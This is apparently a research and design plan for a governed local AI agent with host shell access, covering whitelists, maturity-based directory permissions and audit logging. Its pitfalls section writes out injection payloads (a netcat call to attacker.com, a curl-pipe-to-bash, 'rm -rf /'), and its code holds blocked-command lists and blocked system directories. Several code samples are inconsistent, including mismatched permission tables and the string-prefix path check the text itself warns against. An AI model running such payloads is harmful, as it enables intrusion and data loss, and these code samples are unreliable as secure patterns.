# Phase 2: "God Mode" Local Agent - Research

**Researched:** February 16, 2026
**Domain:** Local AI Agent with Governed Shell/File Access
**Confidence:** HIGH

## Summary

Phase 2 implements a "Local Device Agent" that runs outside the Docker container on the host machine with controlled shell and filesystem access. The agent uses Atom's existing maturity model (STUDENT → INTERN → SUPERVISED → AUTONOMOUS) to earn trust through safe operations, with directory-based permissions and command whitelisting providing defense-in-depth security.

**Key Findings:**

1. **Existing Foundation**: Atom already has `HostShellService`, `ShellSession` model, and governance infrastructure that can be extended for local agent operations. The current implementation is AUTONOMOUS-only with Docker volume mounts - Phase 2 needs to expand this to all maturity levels with host-native execution.

2. **Subprocess Security Best Practices (2026)**: Use `subprocess` with `shell=False` (never `shell=True`), parameterized calls via list arguments (not string concatenation), strict input validation, asyncio for timeout enforcement, and resource limits to prevent runaway processes. Plumbum provides safe shell combinators but adds dependency complexity.

3. **Cross-Platform Path Handling**: `pathlib` is the modern standard (Python 3.4+) for cross-platform path operations - object-oriented, handles Windows/Unix differences automatically, eliminates backslash/forward slash confusion. Recent 2025-2026 articles strongly recommend pathlib over `os.path` for new code.

4. **Deployment Architecture**: Local agent should run as **standalone Python process** on host (NOT in Docker), communicating with main Atom backend via REST API. The daemon mode infrastructure (`cli/daemon.py`) already exists and can be extended. Alternative approaches (Docker-in-Docker, systemd service, direct DB access) were evaluated and rejected based on complexity and security boundaries.

5. **Maturity-Based Directory Permissions**: Atom's existing `GovernanceCache` can be extended with directory-based permission checks. The cache provides <1ms lookups, thread-safe operations, and TTL-based invalidation - perfect for directory/maturity caching.

6. **Command Whitelist Implementation**: Decorator-based whitelist enforcement provides clean separation of concerns - `@whitelisted_command` decorator with maturity level parameters. Config-driven approach (YAML/JSON) was rejected due to runtime validation complexity.

7. **Audit Trail**: Existing `ShellSession` model already captures command, agent_id, user_id, maturity_level, exit code, stdout, stderr, timeout status, and duration. No new models needed - just extend with additional fields for file operations.

**Primary recommendation:** Extend existing `HostShellService` and `ShellSession` infrastructure with maturity-based directory permissions, implement LocalAgentService as standalone host process communicating via REST API, use `pathlib` for cross-platform path handling, and enforce security through decorator-based command whitelisting with subprocess shell=False pattern.

---

## Standard Stack

### Core

| Library | Version | Purpose | Why Standard |
|---------|---------|---------|--------------|
| **subprocess** | Python 3.11+ stdlib | Shell command execution | Official Python stdlib, shell=False prevents injection, asyncio integration for timeouts |
| **pathlib** | Python 3.11+ stdlib | Cross-platform file paths | Modern object-oriented approach (Python 3.4+), automatic OS separator handling, 2025-2026 best practice |
| **asyncio** | Python 3.11+ stdlib | Async subprocess with timeout | Built-in awaitable subprocess, `wait_for()` timeout enforcement, prevents hanging processes |
| **sqlalchemy** | 2.0+ | Database ORM | Already used in Atom, `ShellSession` model exists, mature ORM with async support |
| **fastapi** | 0.100+ | REST API communication | Already used in Atom, async support, automatic OpenAPI docs |

### Supporting

| Library | Version | Purpose | When to Use |
|---------|---------|---------|-------------|
| **plumbum** | 1.8+ | Safe shell combinators | **Alternative to subprocess** - provides shell-like syntax without shell=True, but adds dependency. Use only if subprocess complexity becomes unmanageable |
| **pydantic** | 2.0+ | Request/response validation | Already used in Atom, enforce command/directory structure at API boundaries |
| **click** | 8.0+ | CLI interface | Already used in Atom (`cli/main.py`), for `atom-os local-agent` command |

### Alternatives Considered

| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| **subprocess (stdlib)** | **plumbum** | Plumbum provides cleaner shell-like syntax (`ls["-l"]()`) and pipeline support, but adds external dependency. subprocess with shell=False is equally secure and stdlib. |
| **pathlib** | **os.path** | os.path is string-based (error-prone), requires function nesting. pathlib is object-oriented, chainable, and 2025-2026 best practice. |
| **REST API** | **Direct DB access** | Direct DB access violates service boundaries, couples local agent to backend schema. REST API maintains clean separation, enables independent deployment. |
| **Standalone process** | **Docker-in-Docker** | DinD adds complexity, security concerns, and doesn't actually provide host access. Standalone process is simpler and more secure. |
| **Decorator whitelist** | **Config-driven (YAML/JSON)** | Config-driven requires runtime parsing, validation, and reloading complexity. Decorators are compile-time enforced, type-safe, and self-documenting. |

**Installation:**
```bash
# Core dependencies (already in Atom)
# subprocess, pathlib, asyncio - stdlib, no installation

# Optional (if using plumbum instead of subprocess)
pip install plumbum>=1.8.0

# CLI (already in Atom)
pip install click>=8.0.0
```

---

## Architecture Patterns

### Recommended Project Structure

```
backend/
├── core/
│   ├── local_agent_service.py      # NEW: Main local agent orchestration
│   ├── directory_permission.py     # NEW: Directory-based maturity checks
│   ├── command_whitelist.py        # NEW: Whitelist decorator + validation
│   ├── host_shell_service.py       # EXISTING: Extend for all maturity levels
│   ├── governance_cache.py         # EXISTING: Extend for directory caching
│   └── models.py                   # EXISTING: ShellSession already exists
│
├── api/
│   └── local_agent_routes.py       # NEW: REST API for host backend communication
│
├── cli/
│   ├── local_agent.py              # NEW: CLI for starting/stopping local agent
│   └── daemon.py                   # EXISTING: Extend for local agent daemon mode
│
└── tests/
    ├── test_local_agent_service.py
    ├── test_directory_permissions.py
    ├── test_command_whitelist.py
    └── test_host_shell_service.py  # EXISTING: Extend with maturity tests
```

### Pattern 1: Decorator-Based Command Whitelist

**What:** Decorator that validates shell commands against whitelist before execution, with maturity level parameters.

**When to use:** Every shell command execution point (host_shell_service.py, local_agent_service.py)

**Why:** Compile-time enforcement, type-safe, self-documenting, separates security logic from business logic.

**Example:**
```python
# Source: Existing Atom governance patterns + Python decorator best practices
from core.command_whitelist import whitelisted_command, CommandCategory

class HostShellService:
    @whitelisted_command(
        category=CommandCategory.FILE_READ,
        maturity_levels=[AgentStatus.STUDENT, AgentStatus.INTERN, AgentStatus.SUPERVISED, AgentStatus.AUTONOMOUS]
    )
    async def execute_read_command(
        self,
        agent_id: str,
        command: str,
        working_directory: str,
        db: Session
    ) -> Dict[str, Any]:
        """
        Execute read-only command (ls, cat, grep, etc.).

        Decorator validates:
        1. Command is in FILE_READ whitelist
        2. Agent maturity level is allowed
        3. Working directory is permitted for maturity level
        """
        # subprocess execution with shell=False
        process = await asyncio.create_subprocess_exec(
            *command.split(),  # List args prevent injection
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=working_directory
        )

        stdout, stderr = await asyncio.wait_for(
            process.communicate(),
            timeout=300  # 5-minute timeout
        )

        return {"exit_code": process.returncode, "stdout": stdout, "stderr": stderr}

    @whitelisted_command(
        category=CommandCategory.FILE_WRITE,
        maturity_levels=[AgentStatus.SUPERVISED, AgentStatus.AUTONOMOUS]
    )
    async def execute_write_command(
        self,
        agent_id: str,
        command: str,
        working_directory: str,
        db: Session
    ) -> Dict[str, Any]:
        """
        Execute write command (cp, mv, mkdir, etc.).

        Decorator blocks STUDENT/INTERN agents automatically.
        """
        # Same pattern, different category
        ...
```

**Decorator Implementation:**
```python
# core/command_whitelist.py
from functools import wraps
from typing import List, Dict, Callable, Any
from core.models import AgentStatus
from core.directory_permission import check_directory_permission

# Command categories with maturity requirements
COMMAND_WHITELIST = {
    CommandCategory.FILE_READ: {
        "commands": ["ls", "cat", "head", "tail", "grep", "find", "wc", "pwd"],
        "maturity_levels": [AgentStatus.STUDENT, AgentStatus.INTERN, AgentStatus.SUPERVISED, AgentStatus.AUTONOMOUS]
    },
    CommandCategory.FILE_WRITE: {
        "commands": ["cp", "mv", "mkdir", "touch"],
        "maturity_levels": [AgentStatus.SUPERVISED, AgentStatus.AUTONOMOUS]
    },
    CommandCategory.FILE_DELETE: {
        "commands": ["rm"],
        "maturity_levels": [AgentStatus.AUTONOMOUS]
    },
    CommandCategory.BLOCKED: {
        "commands": ["chmod", "chown", "kill", "sudo", "rm -rf /"],
        "maturity_levels": []  # No agent can execute
    }
}

def whitelisted_command(category: CommandCategory, maturity_levels: List[AgentStatus]):
    """
    Decorator to validate shell commands against whitelist.

    Enforces:
    1. Command is in whitelist category
    2. Agent maturity level is permitted
    3. Directory access is permitted for maturity level
    """
    def decorator(func: Callable) -> Callable:
        @wraps(func)
        async def wrapper(
            agent_id: str,
            command: str,
            working_directory: str,
            db: Session,
            *args,
            **kwargs
        ):
            # Parse base command
            base_command = command.split()[0]

            # Check if command is in category whitelist
            category_whitelist = COMMAND_WHITELIST[category]["commands"]
            if base_command not in category_whitelist:
                raise PermissionError(
                    f"Command '{base_command}' not in {category.value} whitelist"
                )

            # Check agent maturity level
            agent = db.query(AgentRegistry).filter(AgentRegistry.id == agent_id).first()
            if agent.status not in maturity_levels:
                raise PermissionError(
                    f"Agent maturity {agent.status} not permitted for {category.value}"
                )

            # Check directory permission
            dir_check = await check_directory_permission(
                agent_id=agent_id,
                directory=working_directory,
                maturity_level=agent.status,
                db=db
            )

            if not dir_check["allowed"]:
                raise PermissionError(
                    f"Directory '{working_directory}' not permitted for {agent.status}"
                )

            # All checks passed - execute original function
            return await func(agent_id, command, working_directory, db, *args, **kwargs)

        return wrapper
    return decorator
```

### Pattern 2: Directory-Based Permission Cache

**What:** Extend `GovernanceCache` with directory permission lookups (agent_id + directory → allowed/blocked + maturity requirements).

**When to use:** Every file operation or shell command that specifies a working directory.

**Why:** <1ms cache lookups (GovernanceCache proven performance), avoid repeated database queries, thread-safe, TTL-based invalidation.

**Example:**
```python
# core/directory_permission.py
from pathlib import Path
from typing import Dict, Any
from core.governance_cache import get_governance_cache
from core.models import AgentStatus

# Directory permissions by maturity level
DIRECTORY_PERMISSIONS = {
    AgentStatus.STUDENT: {
        "allowed": ["/tmp", "/Downloads"],
        "suggest_only": True  # Can suggest, not execute
    },
    AgentStatus.INTERN: {
        "allowed": ["/tmp", "/Downloads", "/Documents"],
        "suggest_only": True  # Requires approval
    },
    AgentStatus.SUPERVISED: {
        "allowed": ["/Documents", "/Desktop"],
        "suggest_only": True  # Requires approval
    },
    AgentStatus.AUTONOMOUS: {
        "allowed": ["/tmp", "/Downloads", "/Documents"],
        "suggest_only": False  # Auto-execute
    }
}

# Blocked directories for all agents
BLOCKED_DIRECTORIES = ["/etc", "/root", "/sys", "/System", "C:\\Windows", "C:\\Program Files"]

async def check_directory_permission(
    agent_id: str,
    directory: str,
    maturity_level: AgentStatus,
    db: Session
) -> Dict[str, Any]:
    """
    Check if agent can access directory based on maturity level.

    Uses GovernanceCache for <1ms lookups on repeated checks.

    Returns:
        {
            "allowed": bool,
            "suggest_only": bool,
            "reason": str,
            "maturity_level": str
        }
    """
    # Check cache first
    cache = get_governance_cache()
    cache_key = f"{agent_id}:{directory}"

    cached_result = cache.get(cache_key)
    if cached_result:
        return cached_result

    # Resolve path (handle .., symlinks, etc.)
    resolved_path = Path(directory).resolve()

    # Check blocked directories
    for blocked in BLOCKED_DIRECTORIES:
        if str(resolved_path).startswith(blocked):
            result = {
                "allowed": False,
                "suggest_only": False,
                "reason": f"Directory '{directory}' is in blocked list",
                "maturity_level": maturity_level.value
            }
            cache.set(cache_key, result)
            return result

    # Check maturity-based permissions
    permissions = DIRECTORY_PERMISSIONS.get(maturity_level, {"allowed": [], "suggest_only": True})

    # Check if directory is in allowed list
    is_allowed = any(
        str(resolved_path).startswith(allowed_dir)
        for allowed_dir in permissions["allowed"]
    )

    result = {
        "allowed": is_allowed,
        "suggest_only": permissions["suggest_only"],
        "reason": f"Directory access requires {maturity_level.value} maturity",
        "maturity_level": maturity_level.value
    }

    # Cache for 60 seconds
    cache.set(cache_key, result)

    return result
```

### Pattern 3: Local Agent as Standalone Process

**What:** Local agent runs as independent Python process on host machine, communicating with main Atom backend via REST API.

**When to use:** Local agent deployment (Personal Edition), development environment, user-initiated local automation.

**Why:** Clean service boundary, independent deployment/versioning, host-native filesystem access (no Docker volume mounts), can use existing daemon infrastructure.

**Architecture:**
```
┌─────────────────────────────────────────────────────────────┐
│                     Host Machine                             │
│                                                              │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  Local Agent Process (runs as user, NOT root)        │   │
│  │  - python -m atom.local_agent_main                  │   │
│  │  - Manages shell/file operations                     │   │
│  │  - Enforces maturity-based permissions               │   │
│  │  - Logs to ShellSession table                        │   │
│  └──────────────┬───────────────────────────────────────┘   │
│                 │ REST API (HTTP/localhost:8000)            │
│                 ▼                                            │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  Atom Backend (Docker container)                     │   │
│  │  - Agent governance                                  │   │
│  │  - LLM orchestration                                 │   │
│  │  - Workflow engine                                   │   │
│  │  - SQLite/PostgreSQL database                        │   │
│  └──────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

**Implementation:**
```python
# cli/local_agent.py
import click
from cli.daemon import DaemonManager

@click.group()
def local_agent():
    """Local agent management commands."""
    pass

@local_agent.command()
@click.option('--port', default=8000, help='Backend API port')
@click.option('--host', default='localhost', help='Backend API host')
def start(port: int, host: str):
    """
    Start local agent as background service.

    Communicates with Atom backend via REST API for governance checks.
    """
    # Configure backend API URL
    import os
    os.environ["ATOM_BACKEND_URL"] = f"http://{host}:{port}"

    # Start local agent process
    from core.local_agent_service import LocalAgentService
    service = LocalAgentService(backend_url=f"http://{host}:{port}")

    # Start as daemon (reuse existing DaemonManager)
    pid = DaemonManager.start_daemon(
        port=port + 1,  # Local agent on different port
        host="localhost",
        workers=1
    )

    click.echo(f"Local agent started (PID: {pid})")
    click.echo(f"Backend API: http://{host}:{port}")

@local_agent.command()
def status():
    """Check local agent status."""
    status = DaemonManager.get_status()
    if status["running"]:
        click.echo(f"✓ Local agent running (PID: {status['pid']})")
    else:
        click.echo("✗ Local agent not running")

@local_agent.command()
def stop():
    """Stop local agent."""
    stopped = DaemonManager.stop_daemon()
    if stopped:
        click.echo("✓ Local agent stopped")
    else:
        click.echo("✗ Local agent not running")

# core/local_agent_service.py
import httpx
from typing import Dict, Any

class LocalAgentService:
    """
    Local agent service running on host machine.

    Communicates with Atom backend via REST API for:
    - Agent maturity checks
    - Directory permission validation
    - Audit trail logging
    """

    def __init__(self, backend_url: str):
        self.backend_url = backend_url
        self.client = httpx.AsyncClient(base_url=backend_url)

    async def execute_command(
        self,
        agent_id: str,
        command: str,
        working_directory: str
    ) -> Dict[str, Any]:
        """
        Execute shell command with governance checks.

        Flow:
        1. Check maturity via backend API
        2. Check directory permission via backend API
        3. Execute command locally (subprocess)
        4. Log result to backend API
        """
        # Step 1: Check maturity
        response = await self.client.post(
            "/api/agents/governance/check",
            json={
                "agent_id": agent_id,
                "action_type": "shell_execute",
                "directory": working_directory
            }
        )

        governance = response.json()
        if not governance["allowed"]:
            return {
                "allowed": False,
                "reason": governance["reason"],
                "requires_approval": True
            }

        # Step 2: Execute locally
        from core.host_shell_service import host_shell_service
        result = await host_shell_service.execute_shell_command(
            agent_id=agent_id,
            user_id="local-agent",
            command=command,
            working_directory=working_directory,
            timeout=300
        )

        # Step 3: Log to backend
        await self.client.post(
            "/api/shell/log",
            json={
                "agent_id": agent_id,
                "command": command,
                "exit_code": result["exit_code"],
                "stdout": result["stdout"],
                "stderr": result["stderr"]
            }
        )

        return result
```

### Anti-Patterns to Avoid

- **Using `shell=True` in subprocess**: Enables command injection via shell metacharacters (`;`, `|`, `&`, `$()`). Always use `shell=False` with list arguments.
- **Trusting user input for commands**: Never concatenate user input into command strings. Use whitelist validation + parameterized calls.
- **Ignoring cross-platform paths**: Hardcoding `/` or `\` breaks on Windows/macOS. Use `pathlib.Path` for automatic handling.
- **Running local agent as root**: Privilege escalation risk. Run as non-privileged user, reject sudo/chown commands.
- **Docker-in-Docker for host access**: Adds complexity without solving host access problem. Use standalone process instead.
- **Direct database access from local agent**: Couples services, bypasses API governance. Use REST API for all communication.

---

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| **Shell command execution** | Custom shell invocation with `os.system()` | `subprocess.run()` or `asyncio.create_subprocess_exec()` | Built-in timeout handling, process management, security (shell=False), stdlib battle-tested |
| **Cross-platform paths** | String manipulation with `os.path.join()` | `pathlib.Path` | Object-oriented, automatic OS handling, 2025-2026 best practice, eliminates separator bugs |
| **Command validation** | Manual if/elif chains | Decorator-based whitelist (`@whitelisted_command`) | Reusable, type-safe, self-documenting, separates security from business logic |
| **Permission caching** | Custom dict with TTL | `GovernanceCache` (extend existing) | Thread-safe, LRU eviction, proven <1ms performance, async support |
| **Subprocess timeouts** | Custom threading.Timer | `asyncio.wait_for()` | Built-in timeout handling, proper process cleanup, integrates with async/await |
| **Process cleanup** | Manual process.kill() | `asyncio.create_subprocess_exec()` with context manager | Automatic cleanup on exceptions, proper resource management |
| **Path validation** | String startsWith checks | `Path.resolve()` + prefix matching | Handles `..`, symlinks, relative paths, cross-platform normalization |

**Key insight:** Atom already has governance infrastructure (`GovernanceCache`, `AgentGovernanceService`, `ShellSession`). Extend existing patterns rather than rebuilding. subprocess + asyncio + pathlib provide 95% of needed functionality - don't reinvent shell execution or path handling.

---

## Common Pitfalls

### Pitfall 1: Command Injection via `shell=True`

**What goes wrong:** Using `subprocess.run(command, shell=True)` with user-controlled input enables shell metacharacter injection (`; rm -rf /`, `| nc attacker.com 4444`, `$(curl malicious.sh | bash)`).

**Why it happens:** Developers want shell features (pipes, wildcards, environment variables) and `shell=True` is the easiest path.

**How to avoid:**
- **NEVER use `shell=True`** with user input
- Use `subprocess.run(["ls", "-l", path], shell=False)` with list arguments
- For pipes, use Python: `p1 = subprocess.Popen(...); p2 = subprocess.Popen(..., stdin=p1.stdout)`
- Validate commands against whitelist before execution

**Warning signs:** Code passes user strings directly to subprocess, uses `shell=True` parameter, concatenates command strings with `+` or f-strings.

### Pitfall 2: Path Traversal Attacks

**What goes wrong:** Attacker uses `../../../etc/passwd` to access files outside allowed directories.

**Why it happens:** String-based path checking (`path.startswith("/tmp")`) doesn't handle `..`, symlinks, or relative paths.

**How to avoid:**
- Use `Path(user_input).resolve()` to canonicalize paths before checking
- Validate against `Path("/tmp").resolve()` instead of string prefix
- Check both resolved path and original path for consistency

**Warning signs:** String manipulation for paths, `os.path.join()` with user input, no `resolve()` call.

### Pitfall 3: Race Conditions in Governance Checks

**What goes wrong:** Agent passes maturity check, but maturity level changes before command executes (TOCTOU - Time-Of-Check-Time-Of-Use).

**Why it happens:** Governance check and command execution are separate operations with time gap.

**How to avoid:**
- Lock agent maturity level during command execution (database row lock)
- Include maturity_level in ShellSession audit trail
- Use transactional governance check + execution

**Warning signs:** Separate check/execute steps, no transactional governance, mutable agent state during execution.

### Pitfall 4: Subprocess Timeout Not Enforced

**What goes wrong:** Command hangs forever, consuming resources and blocking agent operations.

**Why it happens:** Developers forget `timeout` parameter or use `subprocess.call()` without timeout support.

**How to avoid:**
- Always use `asyncio.wait_for(process.communicate(), timeout=300)` for async
- For sync code, use `subprocess.run(..., timeout=300)`
- Implement `process.kill()` on timeout to force cleanup

**Warning signs:** Subprocess calls without timeout parameter, no error handling for `TimeoutError`, runaway processes in system.

### Pitfall 5: Cross-Platform Path Separator Issues

**What goes wrong:** Code works on Unix (`/`) but breaks on Windows (`\`), or vice versa.

**Why it happens:** Hardcoding path separators, using string concatenation, assuming Unix-only environment.

**How to avoid:**
- Use `pathlib.Path("/tmp") / "subdir" / "file.txt"` - handles separators automatically
- Never use `"/" + path` or `os.path.join()` with user input
- Test on macOS, Linux, and Windows (or GitHub Actions multi-OS)

**Warning signs:** String concatenation for paths, hardcoded `/` or `\`, no `pathlib` usage.

---

## Code Examples

Verified patterns from official sources:

### Safe Subprocess Execution with Timeout

```python
# Source: Python 3.14 asyncio subprocess documentation
# https://docs.python.org/3/library/asyncio-subprocess.html

import asyncio

async def execute_command_safely(command: str, timeout: int = 300):
    """
    Execute command with timeout and proper cleanup.

    Key security features:
    - shell=False (default in create_subprocess_exec)
    - List arguments (not string)
    - Timeout enforcement
    - Automatic cleanup
    """
    # Parse command into list
    args = command.split()

    # Start process
    process = await asyncio.create_subprocess_exec(
        *args,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )

    try:
        # Wait with timeout
        stdout, stderr = await asyncio.wait_for(
            process.communicate(),
            timeout=timeout
        )

        return {
            "exit_code": process.returncode,
            "stdout": stdout.decode(),
            "stderr": stderr.decode(),
            "timed_out": False
        }

    except asyncio.TimeoutError:
        # Kill process on timeout
        process.kill()
        await process.communicate()  # Clean up zombies

        return {
            "exit_code": -1,
            "stdout": "",
            "stderr": f"Command timed out after {timeout}s",
            "timed_out": True
        }
```

### Cross-Platform Path Handling with pathlib

```python
# Source: Python pathlib documentation + 2025-2026 best practices
# https://docs.python.org/3/library/pathlib.html
# https://python.plainenglish.io/mastering-pythons-pathlib-why-you-should-never-use-os-path-again

from pathlib import Path

def validate_directory_access(user_path: str, allowed_base: str) -> bool:
    """
    Validate path is within allowed directory (cross-platform).

    Key features:
    - Resolves .., symlinks, relative paths
    - Handles Windows/Unix separators automatically
    - Prevents path traversal attacks
    """
    # Canonicalize both paths
    resolved_user = Path(user_path).resolve()
    resolved_allowed = Path(allowed_base).resolve()

    # Check if user path is within allowed base
    try:
        resolved_user.relative_to(resolved_allowed)
        return True
    except ValueError:
        # Path is outside allowed directory
        return False

# Usage examples (works on Windows, macOS, Linux):
assert validate_directory_access("/tmp/subdir/file.txt", "/tmp") == True
assert validate_directory_access("/tmp/../etc/passwd", "/tmp") == False
assert validate_directory_access("C:\\Users\\test\\file.txt", "C:\\Users") == True  # Windows
```

### Decorator-Based Whitelist Enforcement

```python
# Source: Python functools documentation + Atom governance patterns
# https://docs.python.org/3/library/functools.html
# Existing: backend/core/governance_decorator.py

from functools import wraps
from typing import Callable, Any
from core.models import AgentStatus

# Whitelist configuration
READ_COMMANDS = {"ls", "cat", "head", "tail", "grep", "find", "wc"}
WRITE_COMMANDS = {"cp", "mv", "mkdir", "touch"}
DELETE_COMMANDS = {"rm"}

def whitelisted_command(
    commands: set,
    maturity_levels: list
):
    """
    Decorator to enforce command whitelist + maturity requirements.

    Usage:
        @whitelisted_command(
            commands=READ_COMMANDS,
            maturity_levels=[AgentStatus.STUDENT, AgentStatus.INTERN]
        )
        async def execute_read_command(...):
            ...
    """
    def decorator(func: Callable) -> Callable:
        @wraps(func)
        async def wrapper(*args, **kwargs):
            # Extract command from kwargs
            command = kwargs.get("command", "")
            base_command = command.split()[0] if command else ""

            # Check whitelist
            if base_command not in commands:
                raise PermissionError(
                    f"Command '{base_command}' not in whitelist"
                )

            # Check maturity level (would query DB in real implementation)
            agent_maturity = kwargs.get("maturity_level", AgentStatus.STUDENT)
            if agent_maturity not in maturity_levels:
                raise PermissionError(
                    f"Agent maturity {agent_maturity} not permitted"
                )

            # All checks passed - execute
            return await func(*args, **kwargs)

        return wrapper
    return decorator

# Example usage
@whitelisted_command(
    commands=READ_COMMANDS,
    maturity_levels=[AgentStatus.STUDENT, AgentStatus.INTERN, AgentStatus.SUPERVISED, AgentStatus.AUTONOMOUS]
)
async def execute_ls_command(command: str, maturity_level: AgentStatus):
    """Execute ls command (all maturity levels allowed)."""
    # Safe subprocess execution
    ...
```

### Governance Cache Integration

```python
# Source: Existing Atom governance_cache.py
# https://github.com/rush86999/atom/blob/main/backend/core/governance_cache.py

from core.governance_cache import get_governance_cache

async def check_directory_permission_cached(
    agent_id: str,
    directory: str,
    maturity_level: AgentStatus
) -> Dict[str, Any]:
    """
    Check directory permission with caching.

    Uses existing GovernanceCache for <1ms lookups.
    """
    cache = get_governance_cache()
    cache_key = f"{agent_id}:{directory}:{maturity_level.value}"

    # Check cache first (sub-millisecond)
    cached = cache.get(cache_key)
    if cached:
        return cached

    # Cache miss - perform full check
    result = await check_directory_permission(
        agent_id=agent_id,
        directory=directory,
        maturity_level=maturity_level
    )

    # Cache result for 60 seconds
    cache.set(cache_key, result)

    return result
```

---

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| **String-based paths** (`os.path.join`) | **Object-oriented paths** (`pathlib.Path`) | Python 3.4+ (2014), widely adopted 2025-2026 | Eliminates separator bugs, cross-platform by default, chainable methods |
| **`os.system()` for shell commands** | **`subprocess.run()` with `shell=False`** | Python 3.5+ (2015), security hardening 2020+ | Prevents command injection, proper process management, timeout support |
| **Sync subprocess execution** | **Async subprocess with `asyncio`** | Python 3.7+ (2018), best practices 2023+ | Non-blocking execution, proper timeout handling, resource cleanup |
| **Manual permission checks** | **Decorator-based enforcement** | Python 3.2+ decorators, governance patterns 2025+ | Separation of concerns, type-safe, self-documenting security |
| **Custom caching solutions** | **GovernanceCache (LRU + TTL)** | Atom Phase 1 (2025), proven <1ms performance | Thread-safe, high throughput (616k ops/s), auto-expiration |
| **Docker-in-Docker for host access** | **Standalone host process + REST API** | 2026 best practices for local agents | Clean service boundaries, independent deployment, no container escape risks |

**Deprecated/outdated:**
- **`os.system()`**: Replaced by `subprocess.run()` - no timeout support, shell=True by default (injection risk)
- **`shell=True` in subprocess**: Security risk - enables command injection, deprecated in security guidelines
- **String-based path manipulation (`os.path.join`, `+` concatenation)**: Error-prone - replaced by pathlib for cross-platform safety
- **Direct database access from services**: Coupling anti-pattern - replaced by REST API for clean boundaries
- **Manual permission if/else chains**: Hard to maintain - replaced by decorator-based governance

---

## Open Questions

### 1. Local Agent Communication Protocol

**Question:** Should local agent communicate with backend via synchronous REST API or asynchronous messaging (WebSocket, Redis pub/sub)?

**What we know:**
- Atom already uses WebSocket for LLM streaming
- REST API is simpler and stateless
- Async messaging provides real-time updates but adds complexity

**Recommendation:** Start with REST API (simpler, stateless, easier to debug). Migrate to WebSocket/Redis if real-time command execution status updates are needed (e.g., long-running commands like `npm install`).

**Validation:** Implement REST API first, measure latency. If >500ms average governance check + execution latency, consider WebSocket for streaming status.

---

### 2. Directory Permission Scope

**Question:** Should directory permissions be absolute paths (`/Users/user/Documents`) or relative to home directory (`~/Documents`)?

**What we know:**
- Absolute paths are clearer but not portable across users
- Relative paths (`~`) are user-friendly but require expansion
- Windows uses different home directory structure (`C:\Users\` vs `/home/`)

**Recommendation:** Use **hybrid approach** - store as relative paths in config (`~/Documents`), expand to absolute paths at runtime using `Path("~").expanduser()`. This provides user-friendly configuration with cross-platform compatibility.

**Implementation:**
```python
# Config (user-friendly)
DIRECTORY_PERMISSIONS = {
    AgentStatus.AUTONOMOUS: ["~/Documents", "~/Downloads", "/tmp"]
}

# Runtime expansion
for dir_spec in DIRECTORY_PERMISSIONS[AgentStatus.AUTONOMOUS]:
    expanded = Path(dir_spec).expanduser().resolve()
    # Use expanded for validation
```

---

### 3. Command Approval Flow for Lower Maturity Agents

**Question:** When STUDENT/INTERN agents suggest commands requiring approval, how should user approval be captured?

**Options:**
- **CLI prompt** (`atom-os approve <session_id>`): Simple but requires terminal access
- **Webhook callback** (POST to user-defined URL): Flexible but requires setup
- **WebSocket notification** (real-time UI): Best UX but most complex
- **Email notification**: Easy but slow, not real-time

**Recommendation:** Start with **CLI prompt** for Personal Edition (simple, terminal-based). For Enterprise Edition, implement **WebSocket notification** integrated with Atom dashboard (already has WebSocket infrastructure for LLM streaming).

**Phased approach:**
1. Phase 2.1: CLI prompt (`atom-os approve --agent-id <id> --command "<cmd>"`)
2. Phase 2.2: WebSocket notification (reuse existing WebSocket infrastructure)
3. Phase 2.3: Webhook callback (for enterprise integrations)

---

### 4. Testing Strategy for Host Shell Access

**Question:** How to test shell execution and file operations safely in CI/CD without risking host system contamination?

**Options:**
- **Mock subprocess calls**: Safe but doesn't test real execution
- **Chroot/container isolation**: Real execution but isolated environment
- **Test-specific directories**: Real operations in `/tmp/atom-test/`
- **GitHub Actions with custom runners**: Full host access but slow

**Recommendation:** **Hybrid approach** - Mock subprocess calls for unit tests (fast, safe), use chroot/Docker container for integration tests (real execution, isolated), test-specific directories (`/tmp/atom-test/`) for local development.

**Implementation:**
```python
# Unit tests (mock subprocess)
def test_command_validation():
    with patch('asyncio.create_subprocess_exec') as mock_subprocess:
        mock_subprocess.return_value = MockProcess(returncode=0)
        result = await execute_command("ls /tmp")
        assert result["exit_code"] == 0

# Integration tests (Docker container)
@pytest.mark.integration
async def test_real_shell_execution():
    # Runs in Docker container with /tmp mounted
    result = await execute_command("ls /tmp")
    assert result["exit_code"] == 0
    assert "atom-test" in result["stdout"]
```

---

### 5. Plumbum vs. subprocess for Shell Command Construction

**Question:** Should we use Plumbum for safe shell combinators or stick with stdlib subprocess?

**What we know:**
- Plumbum provides shell-like syntax (`ls["-l"]()`) without shell=True
- subprocess is stdlib (no dependency), but requires list argument construction
- Plumbum adds ~50KB dependency, subprocess is built-in

**Recommendation:** **Start with subprocess** (stdlib, no dependency, proven in existing `HostShellService`). Consider Plumbum in Phase 2.3 if command construction complexity becomes unmanageable (e.g., complex pipelines, redirections).

**Decision criteria:**
- Use subprocess if: Simple commands (`ls`, `cat`, `grep`), no pipelines
- Consider Plumbum if: Complex pipelines (`ls | grep foo | wc -l`), frequent command composition, shell-like syntax improves readability

**Current decision:** **subprocess** - existing code uses it, stdlib is sufficient for Phase 2 requirements.

---

## Sources

### Primary (HIGH confidence)

- **[Python 3.14 asyncio.subprocess documentation](https://docs.python.org/3/library/asyncio-subprocess.html)** - Official asyncio subprocess APIs, timeout handling, process management
- **[Python 3.14 subprocess documentation](https://docs.python.org/3/library/subprocess.html)** - Official subprocess module, shell=False security, process management
- **[Python pathlib documentation](https://docs.python.org/3/library/pathlib.html)** - Official pathlib module, cross-platform path handling, Path object API
- **[Atom Existing Codebase]** - `backend/core/host_shell_service.py`, `backend/core/governance_cache.py`, `backend/core/agent_governance_service.py`, `backend/core/models.py` (ShellSession), `backend/cli/daemon.py`
- **[Atom FEATURE_ROADMAP.md]** - `.planning/FEATURE_ROADMAP.md` (Phase 2 requirements, architecture, success criteria)

### Secondary (MEDIUM confidence)

